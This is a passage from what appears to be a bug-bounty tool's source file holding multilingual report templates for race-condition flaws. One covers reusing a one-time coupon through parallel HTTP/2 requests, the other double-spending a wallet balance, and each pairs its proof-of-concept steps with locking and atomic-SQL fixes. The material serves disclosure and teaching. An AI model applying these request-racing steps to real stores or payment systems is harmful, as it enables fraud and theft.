      hi: "`python3 race_runner.py <URL> <टोकन>` लिखकर चलाएं।",
    },
  },
];

// ─── 4. HIGH-YIELD BUG BOUNTY REPORT TEMPLATES ───────────────────────────────
export const RACE_REPORT_TEMPLATES: RaceReportTemplate[] = [
  {
    id: "coupon-limit-overrun-p1",
    title: {
      en: "P1 / Critical: Financial Limit Overrun via Single-Packet Race Condition on Promo Code Redemption",
      simple: "P1: Reusing a 1-Time Coupon 15 Times via Race Condition",
      hi: "P1 / क्रिटिकल: रेस कंडीशन के ज़रिए 1-टाइम कूपन को 15 बार इस्तेमाल कर कार्ट 0 करना",
    },
    vulnType: "Business Logic / Race Condition (CWE-362)",
    cvss: "8.5 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:L)",
    severity: "critical",
    reportMarkdown: `## Summary
During the security assessment of **{TARGET_DOMAIN}**, a critical business logic race condition was identified on the coupon redemption endpoint at \`https://{TARGET_DOMAIN}/api/cart/coupon\`.

The platform intends for the promotional discount voucher **{COUPON_CODE}** ($50 value) to be applied strictly once per customer order. However, due to missing database row-level locking during the validation-and-update window, sending concurrent requests via an HTTP/2 Single-Packet Attack enables an attacker to apply the coupon 15 times simultaneously, reducing cart totals from $750 to $0 and acquiring merchandise without payment.

## Vulnerability Details
- **Vulnerable Endpoint:** \`POST https://{TARGET_DOMAIN}/api/cart/coupon\`
- **Vulnerability Type:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
- **Single-Packet Arrival Window:** Sub-3ms spread over multiplexed HTTP/2 connection.
- **Financial Impact:** $700+ unauthorized discount per cart checkout.

## Proof of Concept (PoC)

1. Add items totaling $750 to the shopping cart.
2. In Burp Suite Repeater, craft the coupon application request:
\`\`\`http
POST /api/cart/coupon HTTP/2
Host: {TARGET_DOMAIN}
Authorization: Bearer {USER_AUTH_TOKEN}
Content-Type: application/json

{"cart_id": "{CART_ID}", "coupon": "{COUPON_CODE}"}
\`\`\`
3. Create a tab group of 15 identical requests in Burp Repeater.
4. Execute **'Send group in parallel (single-packet attack)'**.
5. Observe the responses:
   - **Expected behavior:** 1st request returns \`200 OK\` ($50 discount), subsequent 14 requests return \`400: Coupon already redeemed\`.
   - **Observed vulnerable behavior:** 14 out of 15 requests return \`200 OK\`, applying a total discount of $700.
6. Verify cart summary at \`GET /api/cart\`: Cart total balance reflects **$0.00**.
7. Complete checkout successfully with zero payment required.

## Impact
An attacker can systematically deplete company inventory by purchasing unlimited items for free or generating illegitimate store credits, causing severe financial loss and operational disruption.

## Remediation & Mitigation
1. **Row-Level Database Locking:** Wrap coupon validation and redemption inside an atomic database transaction with strict row locking:
   \`\`\`sql
   BEGIN TRANSACTION;
   SELECT used FROM user_coupons WHERE user_id = ? AND code = ? FOR UPDATE;
   -- if used == 0:
   UPDATE user_coupons SET used = 1 WHERE user_id = ? AND code = ?;
   UPDATE carts SET discount = discount + 50 WHERE id = ?;
   COMMIT;
   \`\`\`
2. **Distributed Mutex (Redis Redlock):** Implement an atomic distributed lock on the \`user_id:cart_id\` key in Redis with a 5-second TTL before processing coupon applications.
3. **Idempotency Keys:** Require unique idempotency tokens for financial state transitions.`,
  },
  {
    id: "wallet-double-spend-p1",
    title: {
      en: "P1 / Critical: Wallet Balance Double-Spend via Database Concurrency Collision",
      simple: "P1: Withdrawing Money Twice Simultaneously via Race Condition",
      hi: "P1 / क्रिटिकल: डेटाबेस रेस कंडीशन के ज़रिए वॉलेट से डबल पैसे निकालना",
    },
    vulnType: "Race Condition / Financial Double Spend",
    cvss: "9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N)",
    severity: "critical",
    reportMarkdown: `## Summary
A critical concurrency vulnerability was identified in the peer-to-peer balance transfer API at \`https://{TARGET_DOMAIN}/api/wallet/transfer\`.

By sending two synchronized transfer requests concurrently within the same TCP packet, an attacker can transfer an amount equal to their full wallet balance to two different recipients simultaneously, effectively doubling their funds and causing an unauthorized negative balance in the sender's account.

## Technical Details
- **Vulnerable Endpoint:** \`POST https://{TARGET_DOMAIN}/api/wallet/transfer\`
- **Pre-Condition:** Sender wallet balance is **$100.00**.
- **Exploitation:** Two concurrent requests of $100.00 each sent to Recipient A and Recipient B.
- **Result:** Both transfers succeed; Recipient A receives $100.00, Recipient B receives $100.00 (Total $200.00 transferred).

## Proof of Concept

\`\`\`bash
# Run concurrent transfer requests in parallel via Python or Burp Single-Packet Attack:
Request 1 -> POST /api/wallet/transfer {"recipient": "USER_A", "amount": 100.00}
Request 2 -> POST /api/wallet/transfer {"recipient": "USER_B", "amount": 100.00}
\`\`\`

Both requests return \`HTTP/2 200 OK: {"status": "transferred"}\`. The combined extracted funds exceed the starting balance by 100%.

## Remediation
1. **Atomic SQL Deductions:** Enforce atomic checks directly in the UPDATE query:
   \`\`\`sql
   UPDATE accounts SET balance = balance - 100 WHERE id = ? AND balance >= 100;
   \`\`\`
   Check the number of affected rows: if 0 rows were updated, roll back and abort the transfer.
2. **Queue-Based Sequential Processing:** Route financial transfer requests for a given account through a serialized message queue (e.g. RabbitMQ / Kafka) to eliminate parallel race windows.`,
  },
];
